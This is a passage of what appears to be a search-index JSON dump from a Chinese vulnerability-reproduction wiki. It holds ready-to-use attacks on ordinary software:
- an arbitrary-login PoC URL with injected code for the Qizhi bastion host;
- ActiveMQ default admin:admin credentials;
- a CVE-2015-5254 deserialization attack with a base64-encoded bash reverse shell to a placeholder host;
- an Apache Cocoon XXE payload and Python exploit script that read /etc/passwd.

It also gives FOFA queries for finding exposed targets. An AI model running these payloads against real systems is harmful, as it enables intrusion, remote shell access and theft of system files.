\u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u9f50\u6cbb\u5821\u5792\u673a \u5b58\u5728\u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e\uff0c\u8bbf\u95ee\u7279\u5b9a\u7684Url\u5373\u53ef\u83b7\u5f97\u540e\u53f0\u6743\u9650","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u9f50\u6cbb\u5821\u5792\u673a","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] app=\"\u9f50\u6cbb\u79d1\u6280-\u5821\u5792\u673a\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6f0f\u6d1ePOC\u4e3a http://xxx.xxx.xxx.xxx/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d shterm(QiZhi) Fortress Arbitrary User Login","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20ActiveMQ/Apache%20ActiveMQ%20Console%E6%8E%A7%E5%88%B6%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/","text":"Apache ActiveMQ Console \u5b58\u5728\u9ed8\u8ba4\u5f31\u53e3\u4ee4 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Apache ActiveMQ Console \u5b58\u5728\u9ed8\u8ba4\u5f31\u53e3\u4ee4 admin:admin\uff0c\u8fdb\u5165\u63a7\u5236\u53f0\u540e\u53ef\u88ab\u8fdb\u4e00\u6b65\u6076\u610f\u5229\u7528 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Apache ActiveMQ \u6f0f\u6d1e\u590d\u73b0 \u00b6 Apache ActiveMQ \u9ed8\u8ba4\u5f00\u542f\u4e86 8186 \u63a7\u5236\u53f0 \u8bbf\u95ee\u76ee\u6807: http://xxx.xxx.xxx.xxx:8161/admin \u4f7f\u7528\u9ed8\u8ba4\u53e3\u4ee4 admin:admin Goby & POC \u00b6 [!NOTE] Apache ActiveMQ_Console Weak Password","title":"Apache ActiveMQ Console\u63a7\u5236\u53f0\u9ed8\u8ba4\u5f31\u53e3\u4ee4"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20ActiveMQ/Apache%20ActiveMQ%20Console%E6%8E%A7%E5%88%B6%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/#apache-activemq-console-\u5b58\u5728\u9ed8\u8ba4\u5f31\u53e3\u4ee4","text":"","title":"Apache ActiveMQ Console \u5b58\u5728\u9ed8\u8ba4\u5f31\u53e3\u4ee4"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20ActiveMQ/Apache%20ActiveMQ%20Console%E6%8E%A7%E5%88%B6%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Apache ActiveMQ Console \u5b58\u5728\u9ed8\u8ba4\u5f31\u53e3\u4ee4 admin:admin\uff0c\u8fdb\u5165\u63a7\u5236\u53f0\u540e\u53ef\u88ab\u8fdb\u4e00\u6b65\u6076\u610f\u5229\u7528","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20ActiveMQ/Apache%20ActiveMQ%20Console%E6%8E%A7%E5%88%B6%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Apache ActiveMQ","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20ActiveMQ/Apache%20ActiveMQ%20Console%E6%8E%A7%E5%88%B6%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/#\u6f0f\u6d1e\u590d\u73b0","text":"Apache ActiveMQ \u9ed8\u8ba4\u5f00\u542f\u4e86 8186 \u63a7\u5236\u53f0 \u8bbf\u95ee\u76ee\u6807: http://xxx.xxx.xxx.xxx:8161/admin \u4f7f\u7528\u9ed8\u8ba4\u53e3\u4ee4 admin:admin","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20ActiveMQ/Apache%20ActiveMQ%20Console%E6%8E%A7%E5%88%B6%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/#goby--poc","text":"[!NOTE] Apache ActiveMQ_Console Weak Password","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20ActiveMQ/Apache%20ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2015-5254/","text":"Apache ActiveMQ \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e CVE-2015-5254 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Apache ActiveMQ\u662f\u7f8e\u56fd\u963f\u5e15\u5947\uff08Apache\uff09\u8f6f\u4ef6\u57fa\u91d1\u4f1a\u6240\u7814\u53d1\u7684\u4e00\u5957\u5f00\u6e90\u7684\u6d88\u606f\u4e2d\u95f4\u4ef6\uff0c\u5b83\u652f\u6301Java\u6d88\u606f\u670d\u52a1\uff0c\u96c6\u7fa4\uff0cSpring Framework\u7b49\u3002Apache ActiveMQ 5.13.0\u4e4b\u524d5.x\u7248\u672c\u4e2d\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u7a0b\u5e8f\u6ca1\u6709\u9650\u5236\u53ef\u5728\u4ee3\u7406\u4e2d\u5e8f\u5217\u5316\u7684\u7c7b\u3002\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u501f\u52a9\u7279\u5236\u7684\u5e8f\u5217\u5316\u7684Java\u6d88\u606f\u670d\u52a1\uff08JMS\uff09ObjectMessage\u5bf9\u8c61\u5229\u7528\u8be5\u6f0f\u6d1e\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Apache ActiveMQ 5.13.0\u4e4b\u524d5.x\u7248\u672c \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u9996\u5148\u4e0b\u8f7d jmet \u4e0b\u8f7d\u94fe\u63a5 wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar mkdir external \u5bf9\u76ee\u6807\u53d1\u9001\u4e00\u4e2a\u751f\u6210**/tmp/vuln**\u7684 payload java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \"touch /tmp/vuln\" -Yp ROME xxx.xxx.xxx.xxx 61616 \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8161/admin/browse.jsp?JMSDestination=event \u53ef\u4ee5\u770b\u5230\u591a\u4e86\u4e00\u6761\u6d88\u606f\u961f\u5217 \u70b9\u51fb\u8fd9\u4e2a\u4fe1\u606f\u89e6\u53d1\u6587\u4ef6\u521b\u5efa \u6210\u529f\u6267\u884c\u547d\u4ee4\u521b\u5efa\u6587\u4ef6\uff0c\u4e5f\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u53cd\u5f39shell\u7684payload bash -i > & /dev/tcp/xxx.xxx.xxx.xxx/9999 0 > & 1 ( base64\u7f16\u7801 ) YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx bash -c { echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx } | { base64,-d } | { bash,-i } \u53d1\u9001payload java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}\" -Yp ROME 172 .21.231.183 61616 \u540c\u6837\u70b9\u51fb\u6d88\u606f\u961f\u5217\u4f1a\u89e6\u53d1\u547d\u4ee4\u6267\u884c","title":"Apache ActiveMQ \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e CVE-2015-5254"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20ActiveMQ/Apache%20ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2015-5254/#apache-activemq-\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e-cve-2015-5254","text":"","title":"Apache ActiveMQ \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e CVE-2015-5254"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20ActiveMQ/Apache%20ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2015-5254/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Apache ActiveMQ\u662f\u7f8e\u56fd\u963f\u5e15\u5947\uff08Apache\uff09\u8f6f\u4ef6\u57fa\u91d1\u4f1a\u6240\u7814\u53d1\u7684\u4e00\u5957\u5f00\u6e90\u7684\u6d88\u606f\u4e2d\u95f4\u4ef6\uff0c\u5b83\u652f\u6301Java\u6d88\u606f\u670d\u52a1\uff0c\u96c6\u7fa4\uff0cSpring Framework\u7b49\u3002Apache ActiveMQ 5.13.0\u4e4b\u524d5.x\u7248\u672c\u4e2d\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u7a0b\u5e8f\u6ca1\u6709\u9650\u5236\u53ef\u5728\u4ee3\u7406\u4e2d\u5e8f\u5217\u5316\u7684\u7c7b\u3002\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u501f\u52a9\u7279\u5236\u7684\u5e8f\u5217\u5316\u7684Java\u6d88\u606f\u670d\u52a1\uff08JMS\uff09ObjectMessage\u5bf9\u8c61\u5229\u7528\u8be5\u6f0f\u6d1e\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20ActiveMQ/Apache%20ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2015-5254/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Apache ActiveMQ 5.13.0\u4e4b\u524d5.x\u7248\u672c","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20ActiveMQ/Apache%20ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2015-5254/#\u6f0f\u6d1e\u590d\u73b0","text":"\u9996\u5148\u4e0b\u8f7d jmet \u4e0b\u8f7d\u94fe\u63a5 wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar mkdir external \u5bf9\u76ee\u6807\u53d1\u9001\u4e00\u4e2a\u751f\u6210**/tmp/vuln**\u7684 payload java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \"touch /tmp/vuln\" -Yp ROME xxx.xxx.xxx.xxx 61616 \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8161/admin/browse.jsp?JMSDestination=event \u53ef\u4ee5\u770b\u5230\u591a\u4e86\u4e00\u6761\u6d88\u606f\u961f\u5217 \u70b9\u51fb\u8fd9\u4e2a\u4fe1\u606f\u89e6\u53d1\u6587\u4ef6\u521b\u5efa \u6210\u529f\u6267\u884c\u547d\u4ee4\u521b\u5efa\u6587\u4ef6\uff0c\u4e5f\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u53cd\u5f39shell\u7684payload bash -i > & /dev/tcp/xxx.xxx.xxx.xxx/9999 0 > & 1 ( base64\u7f16\u7801 ) YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx bash -c { echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx } | { base64,-d } | { bash,-i } \u53d1\u9001payload java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}\" -Yp ROME 172 .21.231.183 61616 \u540c\u6837\u70b9\u51fb\u6d88\u606f\u961f\u5217\u4f1a\u89e6\u53d1\u547d\u4ee4\u6267\u884c","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Cocoon/Apache%20Cocoon%20XML%E6%B3%A8%E5%85%A5%20CVE-2020-11991/","text":"Apache Cocoon XML\u6ce8\u5165 CVE-2020-11991 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 9\u670811\u65e5 Apache \u8f6f\u4ef6\u57fa\u91d1\u4f1a\u53d1\u5e03\u5b89\u5168\u516c\u544a\uff0c\u4fee\u590d\u4e86 Apache Cocoon xml\u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u6f0f\u6d1e\uff08CVE-2020-11991\uff09\u3002 Apache Cocoon \u662f\u4e00\u4e2a\u57fa\u4e8e Spring \u6846\u67b6\u7684\u56f4\u7ed5\u5206\u79bb\u7406\u5ff5\u5efa\u7acb\u7684\u6784\u67b6\uff0c\u5728\u8fd9\u79cd\u6846\u67b6\u4e0b\u7684\u6240\u6709\u5904\u7406\u90fd\u88ab\u9884\u5148\u5b9a\u4e49\u597d\u7684\u5904\u7406\u7ec4\u4ef6\u7ebf\u6027\u8fde\u63a5\u8d77\u6765\uff0c\u80fd\u591f\u5c06\u8f93\u5165\u548c\u4ea7\u751f\u7684\u8f93\u51fa\u6309\u7167\u6d41\u6c34\u7ebf\u987a\u5e8f\u5904\u7406\u3002\u7528\u6237\u7fa4\uff1aApache Lenya\u3001Daisy CMS\u3001Hippo CMS\u3001Mindquarry\u7b49\u7b49\uff0cApache Cocoon \u901a\u5e38\u88ab\u4f5c\u4e3a\u4e00\u4e2a\u6570\u636e\u62bd\u53d6\u3001\u8f6c\u6362\u3001\u52a0\u8f7d\u5de5\u5177\u6216\u8005\u662f\u7cfb\u7edf\u4e4b\u95f4\u4f20\u8f93\u6570\u636e\u7684\u4e2d\u8f6c\u7ad9\u3002CVE-2020-11991 \u4e0e StreamGenerator \u6709\u5173\uff0c\u5728\u4f7f\u7528 StreamGenerator \u65f6\uff0c\u4ee3\u7801\u5c06\u89e3\u6790\u7528\u6237\u63d0\u4f9b\u7684 xml\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u5305\u62ec\u5916\u90e8\u7cfb\u7edf\u5b9e\u4f53\u5728\u5185\u7684\u7279\u5236 xml \u6765\u8bbf\u95ee\u670d\u52a1\u5668\u7cfb\u7edf\u4e0a\u7684\u4efb\u4f55\u6587\u4ef6\u3002 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] Apache Cocoon <= 2.1.12 FOFA \u00b6 [!NOTE] app=\"Apache-Cocoon\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u5411**/v2/api/product/manger/getInfo** POST\u5982\u4e0b\u5185\u5bb9 <!--?xml version=\"1.0\" ?--> <!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]> <userInfo> <firstName> John </firstName> <lastName> &ent; </lastName> </userInfo> \u6f0f\u6d1e\u5229\u7528POC \u00b6 #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Cocoon <= 2.1.12 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CVE-2020-11991 \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/v2/api/product/manger/getInfo\" data = \"\"\" <!--?xml version=\"1.0\" ?--> <!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]> <userInfo> <firstName>John</firstName> <lastName>&ent;</lastName> </userInfo> \"\"\" headers = { \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-type\" : \"text/xml\" } response = requests . request ( \"POST\" , url = vuln_url , data = data , headers = headers , timeout = 20 ) if \"/bin/bash\" in response . text : print ( \" \\033 [32m[o] \u542b\u6709CVE-2020-11991\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e3a {} \\033 [0m\" . format ( response . text )) else : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"Apache Cocoon XML\u6ce8\u5165 CVE-2020-11991"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Cocoon/Apache%20Cocoon%20XML%E6%B3%A8%E5%85%A5%20CVE-2020-11991/#apache-cocoon-xml\u6ce8\u5165-cve-2020-11991","text":"","title":"Apache Cocoon XML\u6ce8\u5165 CVE-2020-11991"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Cocoon/Apache%20Cocoon%20XML%E6%B3%A8%E5%85%A5%20CVE-2020-11991/#\u6f0f\u6d1e\u63cf\u8ff0","text":"9\u670811\u65e5 Apache \u8f6f\u4ef6\u57fa\u91d1\u4f1a\u53d1\u5e03\u5b89\u5168\u516c\u544a\uff0c\u4fee\u590d\u4e86 Apache Cocoon xml\u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u6f0f\u6d1e\uff08CVE-2020-11991\uff09\u3002 Apache Cocoon \u662f\u4e00\u4e2a\u57fa\u4e8e Spring \u6846\u67b6\u7684\u56f4\u7ed5\u5206\u79bb\u7406\u5ff5\u5efa\u7acb\u7684\u6784\u67b6\uff0c\u5728\u8fd9\u79cd\u6846\u67b6\u4e0b\u7684\u6240\u6709\u5904\u7406\u90fd\u88ab\u9884\u5148\u5b9a\u4e49\u597d\u7684\u5904\u7406\u7ec4\u4ef6\u7ebf\u6027\u8fde\u63a5\u8d77\u6765\uff0c\u80fd\u591f\u5c06\u8f93\u5165\u548c\u4ea7\u751f\u7684\u8f93\u51fa\u6309\u7167\u6d41\u6c34\u7ebf\u987a\u5e8f\u5904\u7406\u3002\u7528\u6237\u7fa4\uff1aApache Lenya\u3001Daisy CMS\u3001Hippo CMS\u3001Mindquarry\u7b49\u7b49\uff0cApache Cocoon \u901a\u5e38\u88ab\u4f5c\u4e3a\u4e00\u4e2a\u6570\u636e\u62bd\u53d6\u3001\u8f6c\u6362\u3001\u52a0\u8f7d\u5de5\u5177\u6216\u8005\u662f\u7cfb\u7edf\u4e4b\u95f4\u4f20\u8f93\u6570\u636e\u7684\u4e2d\u8f6c\u7ad9\u3002CVE-2020-11991 \u4e0e StreamGenerator \u6709\u5173\uff0c\u5728\u4f7f\u7528 StreamGenerator \u65f6\uff0c\u4ee3\u7801\u5c06\u89e3\u6790\u7528\u6237\u63d0\u4f9b\u7684 xml\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u5305\u62ec\u5916\u90e8\u7cfb\u7edf\u5b9e\u4f53\u5728\u5185\u7684\u7279\u5236 xml \u6765\u8bbf\u95ee\u670d\u52a1\u5668\u7cfb\u7edf\u4e0a\u7684\u4efb\u4f55\u6587\u4ef6\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Cocoon/Apache%20Cocoon%20XML%E6%B3%A8%E5%85%A5%20CVE-2020-11991/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] Apache Cocoon <= 2.1.12","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Cocoon/Apache%20Cocoon%20XML%E6%B3%A8%E5%85%A5%20CVE-2020-11991/#fofa","text":"[!NOTE] app=\"Apache-Cocoon\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Cocoon/Apache%20Cocoon%20XML%E6%B3%A8%E5%85%A5%20CVE-2020-11991/#\u6f0f\u6d1e\u590d\u73b0","text":"\u5411**/v2/api/product/manger/getInfo** POST\u5982\u4e0b\u5185\u5bb9 <!--?xml version=\"1.0\" ?--> <!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]> <userInfo> <firstName> John </firstName> <lastName> &ent; </lastName> </userInfo>","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Cocoon/Apache%20Cocoon%20XML%E6%B3%A8%E5%85%A5%20CVE-2020-11991/#\u6f0f\u6d1e\u5229\u7528poc","text":"#!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Cocoon <= 2.1.12 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CVE-2020-11991 \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/v2/api/product/manger/getInfo\" data = \"\"\" <!--?xml version=\"1.0\" ?--> <!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]> <userInfo> <firstName>John</firstName> <lastName>&ent;</lastName> </userInfo> \"\"\" headers = { \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-type\" : \"text/xml\" } response = requests . request ( \"POST\" , url = vuln_url , data = data , headers = headers , timeout = 20 ) if \"/bin/bash\" in response . text : print ( \" \\033 [32m[o] \u542b\u6709CVE-2020-11991\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e3a {} \\033 [0m\" . format ( response . text )) else : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Druid/Apache%20Druid%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-25646/","text":"Apache Druid \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2021-25646 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Apache Druid \u662f\u7528Java\u7f16\u5199\u7684\u9762\u5411\u5217\u7684\u5f00\u6e90\u5206\u5e03\u5f0f\u6570\u636e\u5b58\u50a8\uff0c\u65e8\u5728\u5feb\u901f\u83b7\u53d6\u5927\u91cf\u4e8b\u4ef6\u6570\u636e\uff0c\u5e76\u5728\u6570\u636e\u4e4b\u4e0a\u63d0\u4f9b\u4f4e\u5ef6\u8fdf\u67e5\u8be2\u3002 Apache Druid 